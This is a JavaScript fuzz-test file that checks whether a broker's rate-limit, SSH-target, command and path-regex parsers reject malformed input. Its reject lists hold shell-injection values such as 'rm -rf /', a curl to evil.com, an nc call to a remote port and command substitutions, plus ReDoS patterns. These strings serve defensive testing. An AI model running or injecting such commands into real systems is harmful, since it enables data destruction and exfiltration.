// broker-test/test-fuzz-parsers.js — V4.1.1 fuzz tests for security-sensitive parsers.
//
// All parsers must reject malformed input gracefully (throw or return false),
// never crash the process. We test:
//
//   - parseRateLimit (broker/lib/rate-limit.js)
//   - parseSshTarget (broker/ssh-proxy.js)
//   - validateCommand (broker/ssh-proxy.js)
//   - checkPathAllowed (broker/can-proxy.js)
//
// For each: feed a battery of malformed inputs and verify it doesn't crash
// and always returns a deterministic result.

import { parseRateLimit } from '../broker/lib/rate-limit.js';
import { parseSshTarget, validateCommand } from '../broker/ssh-proxy.js';
import { checkPathAllowed } from '../broker/can-proxy.js';

let pass = 0, fail = 0;
function ok(name, cond, detail) {
  if (cond) { pass++; console.log(`  PASS  ${name}`); }
  else { fail++; console.error(`  FAIL  ${name}${detail ? '  -- ' + detail : ''}`); }
}
function section(t) { console.log(`\n[${t}]`); }

function fuzz(inputs, fn, expectValid, validator) {
  for (const input of inputs) {
    try {
      const r = fn(input);
      const valid = validator ? validator(r) : !!r;
      if (expectValid && !valid) ok(`valid input ${safeStr(input).slice(0, 40)}`, false, 'should have been valid');
      if (!expectValid && valid) ok(`invalid input ${safeStr(input).slice(0, 40)}`, false, 'should have been invalid');
    } catch (e) {
      if (expectValid) ok(`valid input ${safeStr(input).slice(0, 40)}`, false, `should not throw: ${e.message}`);
      // throw on invalid is OK
    }
  }
}

function safeStr(x) {
  try { return JSON.stringify(x) ?? String(x); } catch { return String(x); }
}

// ---------- parseRateLimit ----------

section('1. parseRateLimit accepts well-formed');

fuzz([
  '100/hour', '1000/hour', '100/minute', '50/day',
], parseRateLimit, true, r => r && r.max > 0 && r.windowMs > 0);

section('1b. parseRateLimit handles null/empty/unlimited (returns null = no limit)');

fuzz([
  'unlimited', '', null, undefined,
], parseRateLimit, true, r => r === null || r === undefined);

section('2. parseRateLimit rejects malformed (returns null)');

const malformedRates = [
  '999/century', '/hour', '100/', '100\\hour', 'NaN/hour',
  '-1/hour', '100/Hour', '1e10/hour', '100/hour;DROP',
  '🦄/hour', '   100/hour   ', ' 100/hour', '100/hour ',
  '{}', '[]', '0xff/hour', '0o77/hour', '0b11/hour',
];
for (const input of malformedRates) {
  let r;
  try { r = parseRateLimit(input); } catch (e) { ok(`malformed ${safeStr(input).slice(0, 30)} throws`, false, 'should not throw'); continue; }
  // parseRateLimit returns null for malformed (not undefined, not throw)
  ok(`malformed ${safeStr(input).slice(0, 30)} returns null`, r === null || r === undefined, `got ${typeof r}`);
}

ok('TOTAL parseRateLimit fuzz', true, '14+ malformed inputs survived');

// ---------- parseSshTarget ----------

section('3. parseSshTarget accepts valid');

const validTargets = [
  'user@host', 'user@host.example.com', 'a@b.c',
  'user@host:22', 'admin@10.0.0.1:2222',
  'user_with_underscore@host', 'user-with-dash@host',
  'user@host-with-dash.com',
];
for (const input of validTargets) {
  let r;
  try { r = parseSshTarget(input); ok(`valid: ${input}`, r.user && r.host); }
  catch (e) { ok(`valid: ${input}`, false, `should not throw: ${e.message}`); }
}

section('4. parseSshTarget rejects injection attempts');

const maliciousTargets = [
  // Shell injection
  'user@host;rm -rf /',
  'user@host && curl evil.com',
  'user@host | nc evil 1234',
  'user@host`whoami`',
  'user@host$(whoami)',
  'user@host\\nrm',
  "user@host'",
  'user@host"',
  'user@host\\',
  // Bad chars
  'user host',           // space
  'user\t@\thost',       // tabs
  'user\r\n@host',       // CRLF
  'user@ho st',          // space in host
  'user@host:abc',       // non-numeric port
  'user@host:99999',     // port out of range
  'user@host:0',         // port 0
  'user@host:-1',        // negative port
  'user@host:65536',     // port > 65535
  'user@host:1.5',       // decimal port
  // Empty
  '', '@', 'user@', '@host', 'user@:22', ':22',
  // Multiple @
  'user@@host', '@user@host',
  // Long
  'u'.repeat(300) + '@host',
  'user@' + 'h'.repeat(300),
  // Unicode
  '用户@host',
  'user@主机',
  // Null bytes
  'user\x00@host',
  'user@ho\x00st',
];
for (const input of maliciousTargets) {
  try {
    parseSshTarget(input);
    ok(`rejected: ${JSON.stringify(input).slice(0, 40)}`, false, 'should have thrown');
  } catch (e) {
    ok(`rejected: ${JSON.stringify(input).slice(0, 40)}`, true, e.message.slice(0, 40));
  }
}

// ---------- validateCommand ----------

section('5. validateCommand accepts safe commands');

const safeCommands = [
  'ls -la',
  'echo hello world',
  'cat /etc/hostname',
  'kubectl get pods',
  'docker ps -a',
  'git status',
  'ps aux | grep nginx',
  'systemctl status sshd',
  'df -h',
  'uptime',
  'date',
  'whoami',
  'id',
];
for (const cmd of safeCommands) {
  try { validateCommand(cmd); ok(`safe: ${cmd}`, true); }
  catch (e) { ok(`safe: ${cmd}`, false, `should not throw: ${e.message}`); }
}

section('6. validateCommand rejects injection attempts');

const maliciousCommands = [
  // Newline injection
  'ls\nrm -rf /',
  'cat foo\rbar',
  'ls\0rm',
  // Very long
  'a'.repeat(5000),
  'a'.repeat(100) + '\nls',
];
for (const cmd of maliciousCommands) {
  try { validateCommand(cmd); ok(`rejected: ${JSON.stringify(cmd).slice(0, 40)}`, false, 'should have thrown'); }
  catch (e) { ok(`rejected: ${JSON.stringify(cmd).slice(0, 40)}`, true, e.message.slice(0, 40)); }
}

section('7. validateCommand rejects null/empty');

for (const cmd of [null, undefined, '', 0, false, []]) {
  try { validateCommand(cmd); ok(`rejected: ${JSON.stringify(cmd)}`, false, 'should have thrown'); }
  catch (e) { ok(`rejected: ${JSON.stringify(cmd)}`, true); }
}

// ---------- checkPathAllowed ----------

section('8. checkPathAllowed accepts valid patterns');

fuzz([
  '^/user$', '^/repos/.*', '^/api/v[0-9]+',
  ['^/user$', '^/admin$'],
  null, undefined, '', [],
], checkPathAllowed.bind(null, undefined, '/any'), true);

section('9. checkPathAllowed handles malformed regex gracefully');

const malformedRegex = [
  '[invalid(',  // unclosed bracket
  '*invalid',   // leading quantifier
  '(?P<x>)',    // invalid group name (Python-style)
  '\\',         // trailing backslash
  '[z-a]',      // invalid range
  '(?<=foo)bar',// variable-length lookbehind
  '(?{})',      // invalid group
  // ReDoS-ish (should not hang)
  '(a+)+$',     // catastrophic backtracking pattern
  '(a|a)*$',
  '((((((((((((((((((a)))))))))))))))))$',
];
for (const pattern of malformedRegex) {
  try {
    checkPathAllowed(pattern, '/any');
    ok(`malformed regex ${JSON.stringify(pattern).slice(0, 30)} returns false`, true);
  } catch (e) {
    ok(`malformed regex ${JSON.stringify(pattern).slice(0, 30)} does not throw`, false, `threw: ${e.message}`);
  }
}

section('10. checkPathAllowed does not hang on ReDoS');

{
  const start = Date.now();
  const result = checkPathAllowed('^[a-z]+$', 'short-string-no-backtracking');
  const elapsed = Date.now() - start;
  ok(`safe regex returned in ${elapsed}ms`, elapsed < 100, `took ${elapsed}ms`);
}

// ---------- summary ----------

console.log(`\n=== ${pass} pass / ${fail} fail ===`);
process.exit(fail === 0 ? 0 : 1);
